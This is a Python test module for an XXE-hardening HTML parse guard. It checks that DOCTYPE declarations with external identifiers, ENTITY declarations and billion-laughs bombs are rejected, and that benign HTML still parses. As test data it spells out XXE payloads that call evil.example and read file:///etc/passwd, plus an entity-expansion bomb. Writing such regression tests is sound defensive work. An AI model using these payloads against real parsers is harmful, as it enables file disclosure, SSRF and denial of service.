"""XXE-hardening regression tests for ``HTMLParseGuard``.

A bare ``lxml.html.fromstring`` call with default settings on
attacker-controlled input processes ``<!DOCTYPE>`` declarations
and can be coerced into external-entity resolution, exposing the
host to XXE / SSRF / information-disclosure.

This module asserts that the new ``_parse_html_safely`` guard:
* rejects DOCTYPE declarations that carry SYSTEM or PUBLIC identifiers,
* rejects any ``<!ENTITY>`` declaration,
* short-circuits billion-laughs payloads without expansion attempts,
* ignores DOCTYPE-looking text inside HTML comments,
* continues to parse benign HTML identically to the old code path.
"""

import pytest
import structlog.testing
from hypothesis import given, settings
from hypothesis import strategies as st

from synthorg.tools.html_parse_guard import HTMLParseGuard


@pytest.fixture
def guard() -> HTMLParseGuard:
    return HTMLParseGuard()


@pytest.mark.unit
class TestDOCTYPERejection:
    """DOCTYPE with external identifier is rejected to safe-empty."""

    def test_external_doctype_system(self, guard: HTMLParseGuard) -> None:
        payload = '<!DOCTYPE foo SYSTEM "http://evil.example/xxe.dtd"><foo>hello</foo>'
        with structlog.testing.capture_logs() as events:
            result = guard.sanitize(payload)
        assert result.cleaned == ""
        assert result.gap_detected is True
        assert result.gap_ratio == pytest.approx(1.0)
        assert any(e.get("event") == "tool.html_parse.xxe_detected" for e in events)

    def test_external_doctype_public(self, guard: HTMLParseGuard) -> None:
        payload = '<!DOCTYPE foo PUBLIC "-//EVIL//" "http://evil.example/"><foo>x</foo>'
        result = guard.sanitize(payload)
        assert result.cleaned == ""
        assert result.gap_detected is True

    def test_case_insensitive_doctype_detection(
        self,
        guard: HTMLParseGuard,
    ) -> None:
        for variant in (
            "<!doctype foo system 'http://evil/'>",
            "<!DocType foo SYSTEM 'http://evil/'>",
            "<!DOCTYPE foo Public 'x' 'http://evil/'>",
        ):
            result = guard.sanitize(variant + "<b>bye</b>")
            assert result.cleaned == ""
            assert result.gap_detected is True

    def test_benign_html5_doctype_not_rejected(
        self,
        guard: HTMLParseGuard,
    ) -> None:
        """The lone ``<!DOCTYPE html>`` (no SYSTEM/PUBLIC) is safe."""
        result = guard.sanitize("<!DOCTYPE html><p>hi</p>")
        assert result.gap_detected is False
        assert "hi" in result.cleaned


@pytest.mark.unit
class TestEntityDeclarationRejection:
    """Internal ENTITY declarations trigger safe-empty."""

    def test_internal_entity_rejected(self, guard: HTMLParseGuard) -> None:
        payload = '<!DOCTYPE foo [<!ENTITY xxe "attacker content">]><foo>&xxe;</foo>'
        result = guard.sanitize(payload)
        assert result.cleaned == ""
        assert result.gap_detected is True

    def test_external_entity_reference_rejected(
        self,
        guard: HTMLParseGuard,
    ) -> None:
        payload = (
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        )
        result = guard.sanitize(payload)
        assert result.cleaned == ""
        assert result.gap_detected is True


@pytest.mark.unit
class TestBillionLaughsDefence:
    """Parser config blocks billion-laughs entity expansion."""

    def test_billion_laughs_safe_empty(self, guard: HTMLParseGuard) -> None:
        payload = (
            "<!DOCTYPE bomb ["
            '<!ENTITY a "aaaaaaaaaa">'
            '<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
            '<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">'
            "]>"
            "<lolz>&c;</lolz>"
        )
        result = guard.sanitize(payload)
        # ENTITY pre-scan rejects; even if it didn't,
        # ``resolve_entities=False`` stops expansion.
        assert result.cleaned == ""
        assert result.gap_detected is True


@pytest.mark.unit
class TestCommentedDOCTYPENotAFalsePositive:
    """A DOCTYPE-shaped string inside an HTML comment is not rejected."""

    def test_commented_doctype_passes_through(
        self,
        guard: HTMLParseGuard,
    ) -> None:
        payload = (
            "<html><body>"
            '<!-- <!DOCTYPE foo SYSTEM "http://evil/"> -->'
            "<p>hello</p>"
            "</body></html>"
        )
        result = guard.sanitize(payload)
        assert result.gap_detected is False
        assert "hello" in result.cleaned


@pytest.mark.unit
class TestUnicodeEncodingBypass:
    """BOM-prefixed + nested payloads should not bypass the XXE pre-scan."""

    def test_utf8_bom_doctype_rejected(self, guard: HTMLParseGuard) -> None:
        # UTF-8 BOM (﻿) prepended to a malicious DOCTYPE.
        payload = '﻿<!DOCTYPE foo SYSTEM "http://evil.example/xxe.dtd"><foo>x</foo>'
        result = guard.sanitize(payload)
        assert result.cleaned == ""
        assert result.gap_detected is True

    def test_nested_doctype_with_entity_rejected(
        self,
        guard: HTMLParseGuard,
    ) -> None:
        """DOCTYPE declaring an internal ENTITY that references an
        external system URL: either the outer DOCTYPE regex or the
        ENTITY regex rejects it (both are sufficient)."""
        payload = (
            '<!DOCTYPE outer [<!ENTITY inner SYSTEM "http://evil.example/">]><x>y</x>'
        )
        result = guard.sanitize(payload)
        assert result.cleaned == ""
        assert result.gap_detected is True


@pytest.mark.unit
class TestBenignRegressionGuard:
    """Ensure the new parser doesn't break existing-behaviour tests."""

    def test_plain_html(self, guard: HTMLParseGuard) -> None:
        result = guard.sanitize("<p>hello <b>world</b></p>")
        assert "hello" in result.cleaned
        assert "world" in result.cleaned
        assert result.gap_detected is False

    def test_script_still_stripped(self, guard: HTMLParseGuard) -> None:
        payload = "<p>safe</p><script>alert(1)</script><p>also</p>"
        result = guard.sanitize(payload)
        assert "alert" not in result.cleaned
        assert "safe" in result.cleaned


@pytest.mark.unit
class TestHypothesisBinarySafety:
    """``sanitize`` never raises an uncaught exception on random input."""

    @given(
        raw=st.text(
            alphabet=st.characters(min_codepoint=0, max_codepoint=0x10FFFF),
            max_size=512,
        ),
    )
    @settings(max_examples=150, deadline=None)
    def test_never_raises(self, raw: str) -> None:
        guard = HTMLParseGuard()
        result = guard.sanitize(raw)
        # Always returns a result; never leaks an exception upstream.
        assert result is not None
